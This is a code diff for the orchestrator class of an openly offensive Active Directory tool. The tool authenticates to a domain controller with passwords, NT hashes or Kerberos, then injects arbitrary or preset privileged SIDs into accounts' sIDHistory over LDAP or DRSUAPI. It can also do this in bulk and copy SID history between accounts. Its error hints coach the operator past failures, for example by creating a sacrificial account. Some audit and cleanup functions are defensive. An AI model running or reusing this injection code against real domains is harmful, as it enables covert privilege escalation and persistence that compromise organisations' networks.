@@ -1,279 +1,409 @@
 """
 SID History Attack Implementation
-Main attack class that orchestrates authentication and LDAP operations.
+Main orchestrator: wires up authentication, LDAP operations,
+DRSUAPI calls, scanning, and output formatting.
 """
 
 import logging
-from typing import Optional, List
+from typing import Optional, List, Dict, Any, Tuple
 
 from .auth import AuthenticationManager
 from .ldap_operations import LDAPOperations
 from .sid_utils import SIDConverter
+from .output import OutputFormatter
+from .scanner import DomainScanner, AuditReport
 
 
 class SIDHistoryAttack:
     """
-    Main class for performing SID History attacks from a remote Linux host.
+    Main class for performing SID History operations from a remote Linux host.
+
+    Supports two injection methods:
+    - LDAP: Direct LDAP modify (works for removal; add may be blocked by DC)
+    - DRSUAPI: RPC-based DRSAddSidHistory (proper method, requires specific conditions)
     """
 
-    def __init__(self, dc_ip: str, domain: str, dc_hostname: Optional[str] = None):
-        """
-        Initialize the SID History attack tool.
+    METHOD_LDAP = 'ldap'
+    METHOD_DRSUAPI = 'drsuapi'
 
-        Args:
-            dc_ip: IP address of the domain controller
-            domain: Target domain name
-            dc_hostname: Hostname of the DC (optional, for Kerberos/SSL)
-        """
+    def __init__(self, dc_ip: str, domain: str, dc_hostname: Optional[str] = None):
         self.dc_ip = dc_ip
         self.domain = domain
         self.dc_hostname = dc_hostname or dc_ip
-        
+
         self.auth_manager = AuthenticationManager(dc_ip, domain, dc_hostname)
         self.connection = None
         self.ldap_ops = None
+        self.drsuapi_client = None
         self.base_dn = SIDConverter.domain_to_dn(domain)
+        self.domain_sid = None
 
-        logging.info(f"Initialized SID History tool targeting {dc_ip} ({domain})")
+        self._formatter = OutputFormatter()
+        self._scanner = None
+
+        logging.info(f"Initialized targeting {dc_ip} ({domain})")
+
+    # ─── CONNECTION MANAGEMENT ────────────────────────────────────────
 
     def authenticate(self, auth_method: str, **kwargs) -> bool:
-        """
-        Authenticate to the domain controller.
-
-        Args:
-            auth_method: Authentication method (ntlm, ntlm-hash, kerberos, certificate, simple)
-            **kwargs: Authentication parameters (username, password, nt_hash, etc.)
-
-        Returns:
-            True if authentication successful, False otherwise
-        """
+        """Authenticate to the domain controller via LDAP."""
         self.connection = self.auth_manager.get_connection(auth_method, **kwargs)
-        
+
         if self.connection:
             self.ldap_ops = LDAPOperations(self.connection, self.base_dn)
+            self._scanner = DomainScanner(self.ldap_ops, self.domain)
+
+            # Try to discover domain SID
+            self.domain_sid = self.ldap_ops.get_domain_sid()
+            if self.domain_sid:
+                logging.info(f"Domain SID: {self.domain_sid}")
+
             logging.info(f"Successfully authenticated to {self.dc_ip}")
             return True
         else:
             logging.error("Authentication failed")
             return False
 
+    def connect_drsuapi(self, username: str = None, password: str = '',
+                        lm_hash: str = '', nt_hash: str = '',
+                        do_kerberos: bool = False) -> bool:
+        """
+        Establish a DRSUAPI RPC connection for DRSAddSidHistory.
+        Uses stored credentials from LDAP auth if not provided.
+        """
+        try:
+            from .drsuapi import DRSUAPIClient
+        except ImportError as e:
+            logging.error(f"DRSUAPI module unavailable: {e}")
+            return False
+
+        self.drsuapi_client = DRSUAPIClient(self.dc_ip, self.domain, self.dc_hostname)
+
+        # Use stored credentials if not provided
+        if not username:
+            username = self.auth_manager._username or ''
+            password = self.auth_manager._password or ''
+            lm_hash = self.auth_manager._lm_hash or ''
+            nt_hash = self.auth_manager._nt_hash or ''
+            do_kerberos = self.auth_manager._do_kerberos
+
+        success = self.drsuapi_client.connect(
+            username=username,
+            password=password,
+            domain=self.domain,
+            lm_hash=lm_hash,
+            nt_hash=nt_hash,
+            do_kerberos=do_kerberos
+        )
+
+        if success:
+            logging.info("DRSUAPI connection established")
+        else:
+            logging.error("Failed to establish DRSUAPI connection")
+            self.drsuapi_client = None
+
+        return success
+
     def disconnect(self):
-        """
-        Close the connection to the domain controller.
-        """
+        """Close all connections."""
         if self.connection:
-            self.connection.unbind()
-            logging.info("Disconnected from domain controller")
-            self.connection = None
-            self.ldap_ops = None
+            try:
+                self.connection.unbind()
+                logging.info("LDAP disconnected")
+            except Exception:
+                pass
+            finally:
+                self.connection = None
+                self.ldap_ops = None
+
+        if self.drsuapi_client:
+            self.drsuapi_client.disconnect()
+            self.drsuapi_client = None
+
+    # ─── SID LOOKUPS ──────────────────────────────────────────────────
 
     def get_user_sid(self, sam_account_name: str) -> Optional[str]:
-        """
-        Retrieve the SID of a user by sAMAccountName.
-
-        Args:
-            sam_account_name: The sAMAccountName of the user
-
-        Returns:
-            SID as a string, or None if not found
-        """
+        """Get the SID of any AD object by sAMAccountName."""
         if not self.ldap_ops:
-            logging.error("Not connected to domain controller")
+            logging.error("Not connected")
             return None
-
-        return self.ldap_ops.get_user_sid(sam_account_name)
+        return self.ldap_ops.get_object_sid(sam_account_name)
 
     def get_current_sid_history(self, sam_account_name: str) -> List[str]:
-        """
-        Retrieve the current SID History of a user.
-
-        Args:
-            sam_account_name: The sAMAccountName of the user
-
-        Returns:
-            List of SIDs in the user's SID History
-        """
+        """Get the current sIDHistory of an object."""
         if not self.ldap_ops:
-            logging.error("Not connected to domain controller")
+            logging.error("Not connected")
             return []
-
         return self.ldap_ops.get_sid_history(sam_account_name)
 
-    def add_sid_to_history(self, target_user: str, sid_to_add: str) -> bool:
+    def get_domain_sid(self) -> Optional[str]:
+        """Get the domain SID."""
+        return self.domain_sid
+
+    def resolve_preset(self, preset_name: str) -> Optional[str]:
+        """Resolve a preset name to a full SID."""
+        if not self.domain_sid:
+            logging.error("Domain SID not available - cannot resolve preset")
+            return None
+        return SIDConverter.resolve_preset(preset_name, self.domain_sid)
+
+    # ─── SID HISTORY INJECTION ────────────────────────────────────────
+
+    def inject_sid_history(self, target_user: str, source_user: str,
+                          source_domain: Optional[str] = None,
+                          method: str = METHOD_LDAP) -> bool:
         """
-        Add a SID to the SID History attribute of a target user.
+        Inject the SID of a source user into the sIDHistory of a target.
 
         Args:
-            target_user: sAMAccountName of the user to modify
-            sid_to_add: SID to add to the user's SID History
-
-        Returns:
-            True if successful, False otherwise
+            target_user: sAMAccountName of target
+            source_user: sAMAccountName of source
+            source_domain: Source domain (for cross-domain/forest)
+            method: 'ldap' or 'drsuapi'
         """
+        if method == self.METHOD_DRSUAPI:
+            return self._inject_via_drsuapi(target_user, source_user, source_domain)
+
+        # LDAP method
+        logging.info(f"Injecting SID from {source_user} into {target_user} (method: LDAP)")
+
+        source_sid = self._resolve_source_sid(source_user, source_domain)
+        if not source_sid:
+            return False
+
+        return self.add_sid_to_history(target_user, source_sid)
+
+    def add_sid_to_history(self, target_user: str, sid_to_add: str,
+                           method: str = METHOD_LDAP) -> bool:
+        """Add a SID to an object's sIDHistory."""
         if not self.ldap_ops:
-            logging.error("Not connected to domain controller")
+            logging.error("Not connected")
             return False
 
         try:
-            user_dn = self.ldap_ops.get_user_dn(target_user)
+            user_dn = self.ldap_ops.get_object_dn(target_user)
             if not user_dn:
                 return False
 
-            current_history = self.ldap_ops.get_sid_history(target_user)
-            
-            if sid_to_add in current_history:
-                logging.warning(f"SID {sid_to_add} already exists in SID History")
+            # Check if already present
+            current = self.ldap_ops.get_sid_history(target_user)
+            if sid_to_add in current:
+                logging.warning(f"SID {sid_to_add} already in sIDHistory")
                 return True
 
-            current_history.append(sid_to_add)
-            
-            success = self.ldap_ops.modify_sid_history(user_dn, current_history)
+            success = self.ldap_ops.add_sid_to_history(user_dn, sid_to_add)
 
             if success:
-                logging.info(f"Successfully added SID {sid_to_add} to {target_user}'s SID History")
-            
+                name = SIDConverter.resolve_sid_name(sid_to_add, self.domain_sid)
+                logging.info(f"Added {sid_to_add} ({name}) to {target_user}'s sIDHistory")
+            else:
+                logging.error("LDAP add failed - the DC likely blocks direct sIDHistory writes")
+                logging.error("Try: --method drsuapi (for cross-forest injection)")
+
             return success
 
         except Exception as e:
             logging.error(f"Error adding SID to history: {e}")
             return False
 
-    def inject_sid_history(self, target_user: str, source_user: str, 
-                          source_domain: Optional[str] = None) -> bool:
-        """
-        Inject the SID of a source user into the SID History of a target user.
-
-        Args:
-            target_user: sAMAccountName of the user to modify
-            source_user: sAMAccountName of the user whose SID to inject
-            source_domain: Optional source domain for trusted domain injection
-
-        Returns:
-            True if successful, False otherwise
-        """
-        if source_domain:
-            logging.info(f"Injecting SID from {source_user}@{source_domain} into {target_user}")
-        else:
-            logging.info(f"Injecting SID from {source_user} into {target_user}")
-
-        source_sid = self._get_user_sid_from_domain(source_user, source_domain)
-        if not source_sid:
-            if source_domain:
-                logging.error(f"Could not retrieve SID for {source_user}@{source_domain}")
-                logging.error("If this is a trusted domain, you may need to provide the SID directly with --sid")
-            else:
-                logging.error(f"Could not retrieve SID for source user {source_user}")
+    def add_sid_preset(self, target_user: str, preset_name: str) -> bool:
+        """Add a well-known SID preset to an object's sIDHistory."""
+        sid = self.resolve_preset(preset_name)
+        if not sid:
+            logging.error(f"Unknown preset: {preset_name}. "
+                        f"Available: {', '.join(SIDConverter.get_preset_list())}")
             return False
 
-        return self.add_sid_to_history(target_user, source_sid)
+        name = SIDConverter.resolve_sid_name(sid, self.domain_sid)
+        logging.info(f"Preset '{preset_name}' -> {sid} ({name})")
+        return self.add_sid_to_history(target_user, sid)
 
-    def _get_user_sid_from_domain(self, source_user: str, 
-                                  source_domain: Optional[str] = None) -> Optional[str]:
-        """
-        Get user SID from current domain or trusted domain.
+    def _inject_via_drsuapi(self, target_user: str, source_user: str,
+                             source_domain: Optional[str] = None) -> bool:
+        """Inject SID History via DRSUAPI RPC (DRSAddSidHistory opnum 20)."""
+        if not self.drsuapi_client:
+            # Try to auto-connect
+            logging.info("Establishing DRSUAPI connection...")
+            if not self.connect_drsuapi():
+                logging.error("Cannot connect to DRSUAPI - required for RPC injection")
+                return False
 
-        Args:
-            source_user: sAMAccountName of the user
-            source_domain: Optional domain to search in (for trusted domains)
+        src_domain = source_domain or self.domain
+        dst_domain = self.domain
 
-        Returns:
-            SID as string or None if not found
-        """
+        logging.info(f"DRSAddSidHistory: {source_user}@{src_domain} -> {target_user}@{dst_domain}")
+
+        success, error_code, error_msg = self.drsuapi_client.add_sid_history(
+            src_domain=src_domain,
+            src_principal=source_user,
+            dst_domain=dst_domain,
+            dst_principal=target_user,
+        )
+
+        if success:
+            logging.info("DRSAddSidHistory RPC call succeeded!")
+        else:
+            logging.error(f"DRSAddSidHistory failed: {error_msg}")
+            self._suggest_drsuapi_fix(error_code)
+
+        return success
+
+    def _resolve_source_sid(self, source_user: str, source_domain: Optional[str] = None) -> Optional[str]:
+        """Resolve source user to SID, supporting cross-domain lookups."""
         if source_domain and source_domain.lower() != self.domain.lower():
-            # Try to search in trusted domain using current connection
-            # Note: This requires the trusted domain objects to be accessible
-            # via the current connection (forest-wide search)
             logging.info(f"Searching for {source_user} in trusted domain {source_domain}")
-            
-            # Attempt forest-wide search
             try:
-                # Try to find the user in the trusted domain
-                # For trusted domains, we search using the domain DN
                 source_base_dn = SIDConverter.domain_to_dn(source_domain)
-                
-                # Create temporary LDAPOperations with source domain base
-                temp_ldap_ops = LDAPOperations(self.connection, source_base_dn)
-                sid = temp_ldap_ops.get_user_sid(source_user)
+                temp_ldap = LDAPOperations(self.connection, source_base_dn)
+                sid = temp_ldap.get_object_sid(source_user)
                 if sid:
                     return sid
             except Exception as e:
-                logging.debug(f"Forest-wide search failed: {e}")
-            
-            # If forest-wide search doesn't work, we can't query the trusted domain
-            # User needs to provide SID directly
-            logging.warning(f"Cannot query trusted domain {source_domain} from current connection")
-            logging.warning(f"Please use --sid to provide the SID directly for {source_user}@{source_domain}")
+                logging.debug(f"Cross-domain lookup failed: {e}")
+
+            logging.warning(f"Cannot query {source_domain} - provide SID directly with --sid")
             return None
-        
-        # Search in current domain
+
         return self.get_user_sid(source_user)
 
+    # ─── SID HISTORY REMOVAL ─────────────────────────────────────────
+
     def remove_sid_from_history(self, target_user: str, sid_to_remove: str) -> bool:
-        """
-        Remove a specific SID from a user's SID History.
-
-        Args:
-            target_user: sAMAccountName of the user to modify
-            sid_to_remove: SID to remove from the user's SID History
-
-        Returns:
-            True if successful, False otherwise
-        """
+        """Remove a specific SID from sIDHistory."""
         if not self.ldap_ops:
-            logging.error("Not connected to domain controller")
+            logging.error("Not connected")
             return False
 
         try:
-            user_dn = self.ldap_ops.get_user_dn(target_user)
+            user_dn = self.ldap_ops.get_object_dn(target_user)
             if not user_dn:
                 return False
 
-            current_history = self.ldap_ops.get_sid_history(target_user)
-            
-            if sid_to_remove not in current_history:
-                logging.warning(f"SID {sid_to_remove} not found in SID History")
+            current = self.ldap_ops.get_sid_history(target_user)
+            if sid_to_remove not in current:
+                logging.warning(f"SID {sid_to_remove} not in sIDHistory")
                 return True
 
-            current_history.remove(sid_to_remove)
-            
-            success = self.ldap_ops.modify_sid_history(user_dn, current_history)
-
+            success = self.ldap_ops.remove_sid_from_history(user_dn, sid_to_remove)
             if success:
-                logging.info(f"Successfully removed SID {sid_to_remove} from {target_user}'s SID History")
-            
+                logging.info(f"Removed {sid_to_remove} from {target_user}")
             return success
 
         except Exception as e:
-            logging.error(f"Error removing SID from history: {e}")
+            logging.error(f"Error removing SID: {e}")
             return False
 
     def clear_sid_history(self, target_user: str) -> bool:
-        """
-        Clear all SID History entries for a user.
-
-        Args:
-            target_user: sAMAccountName of the user to modify
-
-        Returns:
-            True if successful, False otherwise
-        """
+        """Clear all sIDHistory entries."""
         if not self.ldap_ops:
-            logging.error("Not connected to domain controller")
+            logging.error("Not connected")
             return False
 
         try:
-            user_dn = self.ldap_ops.get_user_dn(target_user)
+            user_dn = self.ldap_ops.get_object_dn(target_user)
             if not user_dn:
                 return False
 
-            success = self.ldap_ops.modify_sid_history(user_dn, [])
-
+            success = self.ldap_ops.clear_sid_history(user_dn)
             if success:
-                logging.info(f"Successfully cleared SID History for {target_user}")
-            
+                logging.info(f"Cleared sIDHistory for {target_user}")
             return success
 
         except Exception as e:
-            logging.error(f"Error clearing SID History: {e}")
+            logging.error(f"Error clearing sIDHistory: {e}")
             return False
 
+    def copy_sid_history(self, source_user: str, target_user: str) -> bool:
+        """Copy all sIDHistory from source to target."""
+        source_history = self.get_current_sid_history(source_user)
+        if not source_history:
+            logging.error(f"No sIDHistory found on {source_user}")
+            return False
+
+        success = True
+        for sid in source_history:
+            if not self.add_sid_to_history(target_user, sid):
+                logging.error(f"Failed to copy SID {sid}")
+                success = False
+
+        return success
+
+    # ─── BULK OPERATIONS ──────────────────────────────────────────────
+
+    def bulk_inject(self, targets: List[str], sid_to_add: str) -> Dict[str, bool]:
+        """Inject the same SID into multiple targets."""
+        results = {}
+        for target in targets:
+            logging.info(f"Processing {target}...")
+            results[target] = self.add_sid_to_history(target, sid_to_add)
+        return results
+
+    def bulk_clear(self, targets: List[str]) -> Dict[str, bool]:
+        """Clear sIDHistory from multiple targets."""
+        results = {}
+        for target in targets:
+            logging.info(f"Clearing {target}...")
+            results[target] = self.clear_sid_history(target)
+        return results
+
+    def clean_same_domain_sids(self, target_user: str) -> bool:
+        """Remove only same-domain SIDs from sIDHistory (preserve migration SIDs)."""
+        if not self.domain_sid:
+            logging.error("Domain SID unknown - cannot identify same-domain SIDs")
+            return False
+
+        current = self.get_current_sid_history(target_user)
+        success = True
+
+        for sid in current:
+            if SIDConverter.is_same_domain_sid(sid, self.domain_sid):
+                logging.info(f"Removing same-domain SID: {sid}")
+                if not self.remove_sid_from_history(target_user, sid):
+                    success = False
+
+        return success
+
+    # ─── SCANNING & AUDITING ──────────────────────────────────────────
+
+    def full_audit(self) -> Optional[AuditReport]:
+        """Perform a full domain-wide sIDHistory audit."""
+        if not self._scanner:
+            logging.error("Not connected")
+            return None
+        return self._scanner.full_audit()
+
+    def scan_user(self, sam_account_name: str):
+        """Scan a single object for sIDHistory issues."""
+        if not self._scanner:
+            logging.error("Not connected")
+            return None
+        return self._scanner.scan_user(sam_account_name)
+
+    def enumerate_trusts(self) -> List[Dict]:
+        """Enumerate domain trusts."""
+        if not self.ldap_ops:
+            logging.error("Not connected")
+            return []
+        return self.ldap_ops.enumerate_trusts()
+
+    # ─── HELPERS ──────────────────────────────────────────────────────
+
+    @staticmethod
+    def _suggest_drsuapi_fix(error_code: int):
+        """Suggest fixes for common DRSUAPI errors."""
+        suggestions = {
+            5: "Ensure you have Domain Admin privileges in the destination domain",
+            8547: "You must connect to the DC that holds the destination domain NC",
+            8490: "Cross-forest variant requires source and destination in different forests.\n"
+                  "For same-domain, create a sacrificial account and use --method drsuapi-delsrc",
+            8447: "Enable auditing: 'Audit account management' must be set to Success/Failure\n"
+                  "  in both source and destination domain GPOs",
+            8548: "Source DC could not be reached. Ensure:\n"
+                  "  - Source DC hostname resolves correctly\n"
+                  "  - TcpipClientSupport=1 is set in source DC registry\n"
+                  "  - Source DC is the PDC/PDC Emulator",
+            1355: "Source domain not found. Check DNS and trust configuration",
+        }
+
+        if error_code in suggestions:
+            logging.error(f"Suggestion: {suggestions[error_code]}")
